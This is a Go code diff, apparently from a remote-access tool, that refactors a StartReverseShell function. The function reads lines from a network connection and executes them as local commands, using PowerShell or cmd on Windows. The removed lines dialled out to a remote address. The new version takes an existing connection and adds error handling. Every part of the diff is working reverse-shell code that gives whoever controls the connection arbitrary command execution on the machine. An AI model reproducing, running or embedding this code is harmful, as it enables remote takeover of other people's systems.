@@ -12,17 +12,19 @@ import (
 const prompt = runtime.GOOS + " > "
 
 // StartReverseShell starts a reverse shell from the current machine to address.
-func StartReverseShell(address string) {
-	conn, _ := net.Dial("tcp", address)
-
+// ToDo: Use message encoding from comms package.
+func StartReverseShell(conn net.Conn) (err error) {
 	for {
 		fmt.Fprintf(conn, "\n%s", prompt)
 
-		message, _ := bufio.NewReader(conn).ReadString('\n')
-		toExec := strings.TrimSuffix(message, "\n")
+		message, err := bufio.NewReader(conn).ReadString('\n')
+		if err != nil {
+			return err
+		}
 
+		toExec := strings.TrimSuffix(message, "\n")
 		if toExec == "exit" {
-			return
+			return nil
 		}
 
 		args := strings.Fields(toExec)
@@ -33,6 +35,7 @@ func StartReverseShell(address string) {
 }
 
 // execArgs takes a list of arguments (the first one being a binary) and executes it locally.
+// If on Windows, attempts to use Powershell. Uses cmd as a backup.
 func execArgs(args []string) (out string) {
 	if runtime.GOOS == "windows" {
 		var cmdPrefix []string
@@ -47,9 +50,9 @@ func execArgs(args []string) (out string) {
 		args = append(cmdPrefix, args...)
 	}
 
-	out, err := exec.Command(args[0], args[1:]...).Output()
+	outBytes, err := exec.Command(args[0], args[1:]...).Output()
 	if err != nil {
 		return err.Error()
 	}
-	return out
+	return string(outBytes)
 }
